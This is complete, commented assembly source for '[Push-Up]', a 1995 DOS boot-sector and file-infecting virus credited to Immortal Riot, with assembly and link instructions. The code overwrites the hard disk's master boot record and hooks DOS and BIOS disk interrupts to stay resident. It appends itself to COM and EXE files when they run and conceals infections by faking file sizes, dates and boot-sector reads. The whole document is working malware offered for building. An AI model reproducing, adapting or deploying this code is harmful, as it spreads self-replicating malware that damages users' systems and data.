; To assemble: Tasm /m9 filename.asm
; To link    : tlink /t filename.obj

    .model tiny
    .code
    org 100h

    resid = 5234h
    bs_marker = ''                        ;our mbr/bs marker (love me)
                                                ;or (me love...)
    century = 100 shl 1
    vsize   = (vend-vstart)
    mem_para= ((vend-vstart)/16)+1
    mem_kb  = ((vend-vstart)/1024)+1    ;the memory in kb's+1
    vsect   = ((vend-vstart)/512)+1     ;number of sectors occupied

host_start:

    jmp short vstart                        ;jmp to virus code
    db 0                                    ;pad byte, just for jmp to
                                                ;compile 3 bytes

;Real virus-code begin at this entry....

vstart:
    call $+3                        ;call next instruction
    mov di,sp                       ;move the stackpointer into di
    mov bp,word ptr ss:[di]         ;load bp with the word at ss:[di]
    sub bp,offset $-5       ;sub $ - 5 from it and get
                                        ;relocation offset in BP
                                        ;This is probably to fewl anti-virus
                                        ;"heuristic" general signature
                                        ;scanning. Might be outdated though.

    mov ax,ds                       ;ax=psp
    add ax,10h                      ;10h=psp size

    add word ptr cs:[bp+csip+2],ax  ;fix jmp far (segment) to hosts code
    add word ptr cs:[bp+spss],ax    ;fixup real stack segment (for exe's)

    push ds cs cs                   ;save ds so we can restore it, if exe
    pop ds es                       ;ds=cs=es

    mov ax,resid                    ;ax := 5234h
    mov bx,resid                    ;bx := 5234h
    int 13h
    cmp ax,cx                       ;ax/bx/cx=5234h ?
    jne infect_mbr                  ;
    jmp return_to_host      ;Assume that if resident then
                    ;the mbr must already be infected

;===============================================================================
; int13h: Useful input:                         ; output
                                                ; if function sucessfull
; Write Sector                                  ; ah = 00h
; ah = 03h                                      ; al = # of sectors written
; al = # of sectors to write
; ch = cylinder                                 ; if function NOT ok
; cl = sector                                   ; CF = set
; dh = head                                     ; ah contains status
; dl = drive                                    ; (not equal to 00)
;    - 00-7fh floppy disk
;    - 80-ffh fixed disk
; es:bx = segment:offset of buffer

; Note: The same goes for ah=2 (sector read).
;===============================================================================
infect_mbr:                             ; <- Virus isn't resident!
    mov ax,201h                     ; => Read the first sector of drive
    lea bx,[bp+iobuf]               ; C: (80h) to iobuf via function
    mov cx,1                        ; ah=2 / int 13h al = # of sectors
    mov dx,80h                      ; to read
    int 13h

    mov ax,301h                     ; function ah=3 = sector write
    mov cx,2                        ; Write es:bx (iobuf) to sector 2.
    int 13h                         ; on drive C: (dx=80h).

    mov word ptr [bp+iobuf],03cebh  ;insert jmp to our bootstrap, not
                    ;necessary in mbr infections...

    lea si,[bp+mbr_bs_code]         ;load si with code that will be
    lea di,[bp+iobuf+03eh]          ;written to the sectors
    mov cx,mbr_bs_size+2            ;(+2 due to marker)
    cld                             ;clear direction
    rep movsb                       ;store the mbr loading code in the org
                                        ;mbr(iobuf) and without destorying
                                        ;the partition table

    mov ax,301h                     ;Write iobuf (boot-loading code and
    mov cx,1                        ;partition table to sector on on the
    int 13h                 ;hd

    mov ax,300h+vsect               ;vsect = # of sectors occupied by virus
    lea bx,[bp+vstart]              ;main virus code to sector 3
    mov cx,3                        ;aim at sector 3
    int 13h                         ;sector write

go_resident:

;this goes resident via mcb's.... but only executed
;when started from exe/com file, else there is another routine...

    pop es                          ;restore es to psp due to res-check...
    push es                         ;save es for later use
    mov ax,es                       ;es=Program Segment Prefix
    dec ax                          ;
    mov ds,ax                       ;ds=Memory Control Block

    xor di,di                   ;zero di
    cmp byte ptr ds:[di],'Z'        ;last MCB?
    jne return_to_host              ;if not last mcb-block, bail


    sub word ptr ds:[di+3],mem_para ; allocated memory
    sub word ptr ds:[di+12h],mem_para
    mov es,word ptr ds:[di+12h]

    push cs                         ; cs=ds
    pop ds

    xor di,di                       ; copy virus to TOM
    push di                         ; save di = 0
    lea si,[bp+vstart]              ;
    mov cx,(vsize/2)+1              ; size of virus in words
    cld                             ; clear direction (to inc DI & SI)
    rep movsw               ; copy virus up there

    pop ds                          ;ds=0
    push ds                         ;save ds on the stack
    lds ax,ds:[21h*4]               ;get int21h segment:offset adress
    mov word ptr es:[o21-vstart],ax ;directly from the ivt's adress
    mov word ptr es:[o21-vstart+2],ds
    pop ds                          ;load ds from the stack
    mov word ptr ds:[21h*4],(i21-vstart) ; set new interrupt 21h handler
    mov word ptr ds:[21h*4+2],es         ; to point to our virus code

    push ds                         ; do the same thing, but this time
    lds ax,ds:[13h*4]               ; fix interrupt 13h
    mov word ptr es:[o13-vstart],ax
    mov word ptr es:[o13-vstart+2],ds
    pop ds
    mov word ptr ds:[13h*4],(i13-vstart)
    mov word ptr ds:[13h*4+2],es
    mov byte ptr es:[i13-vstart],0f9h   ;put a STC there so no re-hook
                                                ;of interrupt 21h is being
                        ;performed

mbr_already_infected:                           ;since mbr already infected
                                                ;the virus should be resident
                                                ;either via mbr or file...

return_to_host:
    pop ds                                  ;restore ds
    push ds
    pop es                                  ;es=ds=psp


    cmp byte ptr cs:[bp+infection_type],0   ;if infection_type = 0
    je com_return                   ;it's a com-file, else
                                                ;assume exe-file

exe_return:
    cli                                     ;disable maskable interrupts
    mov sp, word ptr cs:[bp+spss+2]         ;during ss/sp modifictions
    mov ss, word ptr cs:[bp+spss]           ;
    sti                         ;recognize interrupt again

    xor ax,ax                               ;clear ax before stating host
                                                ;and...
    db 0eah                                 ;jmp far ptr org_exe cs:ip
    csip        dd 0            ;exe-hosts original cs:ip
    spss        dd 0            ;exe-hosts org ss:sp

com_return:
    mov di,100h                             ;com-file starts at cs:100h
    push di                     ;save di at 100h
                                                ;so we return to cs:100h
                                                ;once we do a 'RET'
    lea si,[bp+offset org_com]              ;original 3 bytes stored
    movsw                                   ;in org_com is copied
    movsb                       ;from source ds:si to
                                                ;destination es:di

    ret                                     ;ret to 100h


mbr_bs_code:                                    ;this code is written to
                                                ;infected disks mbr/bs

    mov si,7c00h
    xor ax,ax

    cli                                     ;disable maskable interrupts
    mov ss,ax                               ;ss=0
    mov sp,si                           ;sp=7c00h
    sti                                     ;set stack to (sp:sp) 0:7c00h,
                                                ;just below our current cs:ip

    mov ds,ax                               ;cs=ds=0

allocate_memory_via_bios:
    sub word ptr ds:[413h], mem_kb      ;subtract bios-memory with
                        ;virus size in kilobytes

    int 12h                                 ;get memory from bios (kb's)
                                                ;output in ax

    mov cl,6
    shl ax,cl                               ;really a ax/1024
    mov es,ax                               ;es=segment of _non-existing_
                                                ;memory (memory allocated for
                                    ;virus-code)

    xor dh,dh                               ;zero dh

    cmp dl,80h                              ;check if it's hdd0, (dl=80h)
    je mbr_start                            ;then it is a mbr start


floppy_start:                                   ;This code seems to be
                                                ;pretty unfinished. I wonder
                                                ;how floppies are being taken
                                                ;care off.
mbr_start:
    xor bx,bx
    mov ax,200h+vsect
    mov cx,3
    push dx                                 ;save drive
    int 13h                                 ;read vsect number of sectors
                                                ;with start at sector 3 of
                                                ;hd into vir_seg (es)


    push ds                                 ;ds=0
    lds ax,ds:[13h*4]                       ;get int 13h's vector
    mov word ptr es:[o13-vstart],ax
    mov word ptr es:[o13-vstart+2],ds   ;save int 13h's vector
    pop ds
    mov word ptr ds:[13h*4],(i13-vstart)
    mov word ptr ds:[13h*4+2],es        ;set int 13h to point to es:i13

    push ds                                 ;ds=0
    push es
    mov dx,(load_mbr_bs-vstart)
    push dx
    retf                                    ;jmp to es:dx, our vir_seg
                                                ;and our code to load
                                                ;the real mbr/bs
mbr_bs_size = $-mbr_bs_code                     ;size of mbr/bs code -2
    dw bs_marker


load_mbr_bs:
    pop es                                  ;es=0
    mov ax,201h                             ;read sector 2 to
    mov bx,7c00h                            ;es:bx = 0000:7c00h
    mov cx,2                                ;sector # = 2 (saved_code)
    pop dx                                  ;dx=80h
    int 13h                                 ;load the real mbr/bs from
                                                ;sector 2 where we stored it
                                                ;(see proc infect_mbr)
    push es
    push bx
    retf                                    ;jmp to 0:7c00h and execute the
                                                ;real bs/mbr


i13:
    clc                                     ;changed to a stc when int 21h
                                                ;is hooked
    jc got_i21                              ;if we have int21h, don't check
                                                ;for exe files being exec'd
                                            ;(int21h not yet set)
    cmp es:[bx],'ZM'                        ;check for first EXE file to be
    jne got_i21                             ;loaded

hook_i21:                                       ;hook interrupt 21h from
    push ds ax                              ;the bs/mbr code

    xor ax,ax
    mov ds,ax                               ; ds = 0
    push ds
    lds ax,ds:[21h*4]
    mov word ptr cs:[o21-vstart],ax
    mov word ptr cs:[o21-vstart+2],ds
    pop ds
    mov word ptr ds:[21h*4],(i21-vstart)
    mov word ptr ds:[21h*4+2],cs
    pop ax ds

    mov byte ptr cs:[i13-vstart],0f9h   ;puts a stc at i13
                                                ;(so we recognize it's hooked!)

got_i21:
res_check:

        cmp ax,resid                            ;instalation check cmp ax,5234h
    jne check_stealth_bs_mbr                ;not equal check next function

        cmp bx,resid                            ;ax = res_chk check check
    jne check_stealth_bs_mbr                ;bx for same value
    mov cx,resid                            ;if ax & bx = 5234h, load
    iret                        ;cx with it, too and return

check_stealth_bs_mbr:
    cmp cx,1                                ;check ANY int13h function
    jne org13                               ;for "track 0, sector 1" (or so)
    cmp ah,2                                ;check for sector-read w/int13h
    je stealth_mbr_floppy                   ;sector_read on sec#1 = stealth!
    cmp ah,3                                ;write to sec#1 ?
    je stealth_mbr_floppy                   ;redirect that, too.

org13:  db 0eah                                 ;jmp far ptr ORG13h
o13 dd 0                                    ;segment:offset adress
    ret                                     ;if we call org13h, return
                                                ;to proper adress...

stealth_mbr_floppy:
    cmp dx,80h
    ja org13                                ;it's not drive C: = bail
    jb floppy_stealth                       ;(floppy stealth is not yet
                                            ;implemented, it seems)
mbr_stealth:
    inc cx                                  ;redirect read/write to sector2
                                                ;where the orig_mbr is stored

    call org13
    dec cx                                  ;CX = not altered
    retf 2                                  ;return

floppy_stealth:
    jmp short org13



;===============================================================================
; INTERRUPT 21H HANDLER
; ---------------------
; ax = 5234h = Used for resident-call via int21h
; ah = 4bh   = Execute, infect.
; ah = 11h   = Find first file via FCB. Decrease file_size increases
; ah = 12h   = Find next file via FCB.. Decrease file_size increases
; ah = 4eh   = Find first file via file handle. Decrease size increases
; ah = 4fh   = Find next file via file handle.. Decrease size increases
;===============================================================================

i21:
    cmp ax,resid                            ;if ax = 5234h, return
    jne _4b                                 ;that value to bx, too
    mov bx,resid                            ;and return.
    iret

_4b:    cmp ax,4b00h                            ;infect on file_execute
    je infect
_11:    cmp ah,11h                              ;file stealth
    jne _12
    jmp Stealth_FCB
_12:    cmp ah,12h                              ;file stealth
    jne _4e
    jmp Stealth_FCB
_4e:    cmp ah,4eh                              ;file stealth
    jne _4f
    jmp Stealth_Handle
_4f:    cmp ah,4fh                              ;file stealth
    jne org21
    jmp Stealth_Handle

org21:  db 0eah                                 ;jmp far ptr
o21 dd 0                                    ;segment:offset to saved int21h
    ret                                     ;in case of a call, return.

infect:
    push ax bx cx dx di si ds es            ;save register in use
    mov cx,64
    mov al,'.'
    mov di,dx
    cld
    repne scasb
    cmp word ptr [di-3],'RI'
    jne go_on1                              ;alter this to a "je go_on1" to
                                                ;test this w/o infecting
                                                ;files!

no_open_jmp:
        jmp no_open

go_on1:
    mov ax,3d82h                            ;open file in read/write mode
    int 21h
    jc no_open_jmp                          ;error open => bail

    xchg ax,bx                              ;place filehandle in BX

    push cs cs
    pop es ds                               ;es=ds=cs

    mov ax,5700h                            ;get file's date/time stuff
    int 21h

    cmp dh,century                          ;if it century marked,
    jb read_first                           ;assume infection by us, else
    jmp restore_td                          ;bail..

read_first:
    push cx dx                              ;save date/time stamp

    mov ah,3fh                              ;read first 18h bytes of
    mov dx,(exeheader-vstart)           ;file to a buffer called
    mov cx,18h                              ;"exeheader" in this source.
    int 21h

    mov ax,4202h                            ;seek EOF and get filesize
    xor cx,cx                               ;returned in dx/ax
    cwd
    int 21h

    cmp dx,0                                ;check for "valid" file-sizes
    ja large_enough                         ;ie. not too big/small.
    cmp ax,vsize
    ja large_enough

    pop dx cx                               ;restore time/date
    jmp restore_td

large_enough:
    cmp word ptr ds:[exeheader-vstart],'ZM' ;is it an exefile ?
    je infect_EXE
    cmp word ptr ds:[exeheader-vstart],'MZ' ;is it an exefile ?
    je infect_EXE

Infect_COM:                                 ;since we ONLY infect on
                                                ;execute, if a program is
                                                ;executed by DOS and not
                                                ;exe, assume .COM!

    mov byte ptr ds:[infection_type-vstart],0   ;mark com-infect=on

    sub ax,3                                ;ax=fsize
    mov word ptr ds:[new_com-vstart+1],ax   ;store jmp to v-code
    mov cx,3
    mov dx,(new_com-vstart)
    push cx dx

EXE_continue:                                   ;exe_infection will reach
                                                ;this entry later
write_virus:
    mov ah,40h                              ;function ah=40h, write to
    mov cx,vsize                            ;file cx=bytes.
    cwd                                     ;ds:dx=buffer to write from
    int 21h                                 ;bx=filehandle

    cmp byte ptr ds:[infection_type-vstart],0 ; check for com_infect
    je write_first_bytes                      ; equal, write first bytes!




    mov ax,4202h                            ;else, continue to infect
    xor cx,cx                               ;an executed EXE
    cwd
    int 21h                                 ;<- Seek end of file

    mov cx,512                              ;Convert size to 512-byte
    div cx                                  ;pages
        or dx,dx
        jz no_increasment
    inc ax
no_increasment:
    mov word ptr ds:[exeheader-vstart+2],dx ; Insert new filesize
    mov word ptr ds:[exeheader-vstart+4],ax ; into EXE header


write_first_bytes:                              ; Goto TOF and
    mov ax,4200h
    xor cx,cx
    cwd
    int 21h

    mov ah,40h                              ;write header-info
    pop dx cx                           ;cx=3 if com, 18h if  exe
    int 21h

    pop dx cx                               ;restore time/date stamp from
    add dh,century                          ;stack. Mark with another
                                                ;100 years...

restore_td:                                     ;<- Restore_time_date
    mov ax,5701h                            ;but add 100 years..
    int 21h

close:                                          ;Close file
    mov ah,3eh
    int 21h
no_open:
    pop es ds si di dx cx bx ax             ;restore segment/registers
    jmp org21                               ;and return to int21h


Infect_EXE:
    mov byte ptr ds:[infection_type-vstart],1   ;mark exe-infect

    mov di,(csip-vstart)
    mov si,(exeheader-vstart+14h)
    movsw
    movsw                   ;save original cs/ip
    mov si,(exeheader-vstart+0Eh)
    movsw
    movsw                   ;save original ss/sp

    mov cx,10h
    div cx                                  ;dx:ax (fsize/10h) = para's
    sub ax,word ptr ds:[exeheader-vstart+8] ;sub headersize
    mov word ptr ds:[exeheader-vstart+14h],dx ;Set starting CS:IP
    mov word ptr ds:[exeheader-vstart+16h],ax ;to end of EXE
    add ax,100h
    mov word ptr ds:[exeheader-vstart+0Eh],ax
    mov word ptr ds:[exeheader-vstart+10h],100h

    mov cx,18h
    mov dx,(exeheader-vstart)
    push cx dx
    jmp EXE_continue

;===============================================================================
; DIR-STEALTH ROUTINE
;===============================================================================

; 11/12/4e/4fh stealth routines are so common and generic these days,
; so it's for no reason to comment them. Similar routines can
; be found in for example ir-mag#7.zip (reality.013).

Stealth_FCB:
    pushf
    push cs
    call org21
    or al,al
    jnz FCB_error

    push ax bx es

    mov ah,51h
    int 21h
    mov es,bx
    cmp bx,es:[16h]
    jnz no_stealth

    mov bx,dx
    mov ax,[bx]
    push ax
    mov ah,2fh
    int 21h
    pop ax
    inc al
    jnz not_extended
    add bx,7
not_extended:
    mov ax,word ptr es:[bx+19h]
    cmp ah,century
    jb no_stealth                           ;not century marked...
    sub ah,century
    mov word ptr es:[bx+19h],ax
;   cmp word ptr es:[bx+1dh],vsize          ;Skip all file_size checks
;   ja fcb_stealth                          ;because it's pretty unlikely
;   cmp word ptr es:[bx+1fh],0              ;that any other file is
;   je no_stealth                   ;marked with + 100 years.

fcb_stealth:
    sub word ptr es:[bx+1dh],vsize
    sbb word ptr es:[bx+1fh],0      ;size stealth done...
no_stealth:
    pop es bx ax
FCB_error:
    iret


;==============================================================================
; Stealth on dir7's directory listenings, or other program which uses
; 4e/4fh for operating.
;==============================================================================

Stealth_Handle:
    pushf
    push cs
    call org21
    jc handle_error

    pushf
    push ax bx es

    mov ah,2fh
    int 21h

    mov ax,word ptr es:[bx+18h]

    cmp ah,century
    jb no_stealth_

    sub ah,century
    mov word ptr es:[bx+18h],ax

;   cmp word ptr es:[bx+1ah],vsize
;   ja stealth2
;   cmp word ptr es:[bx+1ch],0
;   je no_stealth_

stealth2:
    sub word ptr es:[bx+1ah],vsize
    sbb word ptr es:[bx+1ch],0

no_stealth_:
    pop es bx ax
    popf
Handle_Error:
    retf 2                                  ;don't change flags...


vname   db '[Push-Up] v0.001á '                 ;virusname & version
EGO_tag db '(C) 1995 Immortal Riot (Sweden)'    ;group & origin

    infection_type  db 0            ;0=COM,1=EXE
    new_com     db 0e9h,0,0     ;new host bytes, if com(our jmp)
    exeheader:
    org_com     db 0cdh,20h,0       ;original hosts bytes, if com
            db 16h dup (0)      ;exe-header...

vend:
heap:

    iobuf db 512 dup(?)     ;a buffer for the original boot-record

heap_end:

    end host_start

